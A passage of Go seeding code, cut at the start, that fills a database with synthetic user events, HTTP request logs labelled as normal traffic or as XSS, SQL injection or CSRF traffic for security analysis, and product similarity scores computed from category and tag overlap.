					return fmt.Errorf("failed to insert user event batch: %w", err)
				}
				batch = batch[:0]
			}
		}
	}

	// Insert remaining events
	if len(batch) > 0 {
		if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
			return fmt.Errorf("failed to insert final user event batch: %w", err)
		}
	}

	log.Printf("✅ Successfully created %d realistic user interaction events", totalEvents)
	return nil
}

func seedEnhancedHttpLogs(users []models.User) error {
	log.Printf("🔒 Seeding enhanced HTTP logs for security analysis...")

	batch := make([]models.HttpRequestLog, 0, 500)

	// HTTP paths for realistic traffic simulation
	normalPaths := []string{
		"/api/v1/products", "/api/v1/products/search", "/api/v1/categories",
		"/api/v1/users/profile", "/api/v1/auth/login", "/api/v1/auth/register",
		"/api/v1/favorites", "/api/v1/comments", "/api/v1/recommendations",
		"/health", "/api/v1/cart", "/api/v1/orders", "/static/css/main.css",
		"/static/js/app.js", "/favicon.ico", "/robots.txt",
	}

	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH"}
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
	}

	for i := 0; i < ML_HTTP_LOGS_COUNT; i++ {
		var user *models.User
		var userID *uuid.UUID
		var ipAddress string
		var path string
		var method string
		var suspectedAttackType string

		// 85% normal traffic, 15% malicious
		if rand.Float64() < 0.85 {
			// Normal traffic
			user = &users[rand.Intn(len(users))]
			userID = &user.ID
			ipAddress = fmt.Sprintf("192.168.%d.%d", rand.Intn(255), rand.Intn(255))

			path = normalPaths[rand.Intn(len(normalPaths))]
			method = methods[rand.Intn(len(methods))]
			suspectedAttackType = "unknown"
		} else {
			// Malicious traffic
			ipAddress = fmt.Sprintf("10.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255))

			// Choose attack type
			attackRoll := rand.Float64()
			switch {
			case attackRoll < 0.4: // 40% XSS
				suspectedAttackType = "xss"
				attack := enhancedXSSAttacks[rand.Intn(len(enhancedXSSAttacks))]
				path = fmt.Sprintf("/search?q=%s", attack)
				method = "GET"
			case attackRoll < 0.7: // 30% SQL Injection
				suspectedAttackType = "sqli"
				path = "/api/v1/auth/login"
				method = "POST"
			default: // 30% CSRF
				suspectedAttackType = "csrf"
				path = "/api/v1/transfer"
				method = "POST"
			}
		}

		userAgent := userAgents[rand.Intn(len(userAgents))]

		httpLog := models.HttpRequestLog{
			ID:                  uuid.New(),
			UserID:              userID,
			IPAddress:           &ipAddress,
			UserAgent:           &userAgent,
			Path:                &path,
			Method:              &method,
			SuspectedAttackType: &suspectedAttackType,
			Timestamp:           randomPastTime(30), // Last 30 days
		}

		batch = append(batch, httpLog)

		// Insert in batches
		if len(batch) == 500 || i == ML_HTTP_LOGS_COUNT-1 {
			if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
				return fmt.Errorf("failed to insert HTTP log batch: %w", err)
			}
			batch = batch[:0]
		}
	}

	log.Printf("✅ Successfully created %d HTTP logs (85%% normal, 15%% attacks)", ML_HTTP_LOGS_COUNT)
	return nil
}

func seedEnhancedProductSimilarity(products []models.Product) error {
	log.Printf("🔗 Seeding enhanced product similarity data...")

	batch := make([]models.ProductSimilarityData, 0, 500)
	similarityMap := make(map[string]bool) // To avoid duplicates
	totalSimilarities := 0

	for i, product1 := range products {
		if totalSimilarities >= ML_SIMILARITY_DATA_COUNT {
			break
		}

		// Find similar products based on category and tags
		for j, product2 := range products {
			if i == j || totalSimilarities >= ML_SIMILARITY_DATA_COUNT {
				continue
			}

			// Create unique key for this pair
			key1 := fmt.Sprintf("%s-%s", product1.ID.String(), product2.ID.String())
			key2 := fmt.Sprintf("%s-%s", product2.ID.String(), product1.ID.String())

			if similarityMap[key1] || similarityMap[key2] {
				continue
			}

			// Calculate similarity score based on category and tags
			var score float64 = 0.0

			// Same category = +0.4 base similarity
			if product1.CategoryID != nil && product2.CategoryID != nil && *product1.CategoryID == *product2.CategoryID {
				score += 0.4
			}

			// Tag overlap adds to similarity
			tags1 := make(map[string]bool)
			for _, tag := range product1.Tags {
				tags1[tag] = true
			}

			commonTags := 0
			for _, tag := range product2.Tags {
				if tags1[tag] {
					commonTags++
				}
			}

			if len(product1.Tags) > 0 && len(product2.Tags) > 0 {
				tagSimilarity := float64(commonTags) / float64(len(product1.Tags)+len(product2.Tags)-commonTags)
				score += tagSimilarity * 0.6
			}

			// Add some random variation
			score += (rand.Float64() - 0.5) * 0.2

			// Keep score between 0 and 1
			if score < 0 {
				score = 0
			}
			if score > 1 {
				score = 1
			}

			// Only create similarity if score is reasonable (> 0.2)
			if score > 0.2 {
				similarity := models.ProductSimilarityData{
					ID:               uuid.New(),
					ProductID:        product1.ID,
					SimilarProductID: product2.ID,
					SimilarityScore:  score,
				}

				batch = append(batch, similarity)
				similarityMap[key1] = true
				totalSimilarities++

				// Insert in batches
				if len(batch) == 500 {
					if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
						return fmt.Errorf("failed to insert similarity batch: %w", err)
					}
					batch = batch[:0]
				}
			}
		}
	}

	// Insert remaining similarities
	if len(batch) > 0 {
		if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
			return fmt.Errorf("failed to insert final similarity batch: %w", err)
		}
	}

	log.Printf("✅ Successfully created %d product similarity relationships", totalSimilarities)
	return nil
}

// Store categories globally for use in other functions
var categories []models.Category

func randomPastTime(maxDaysAgo int) time.Time {
	daysAgo := rand.Intn(maxDaysAgo)
	hoursAgo := rand.Intn(24)
	minutesAgo := rand.Intn(60)
	return time.Now().AddDate(0, 0, -daysAgo).Add(-time.Duration(hoursAgo) * time.Hour).Add(-time.Duration(minutesAgo) * time.Minute)
}
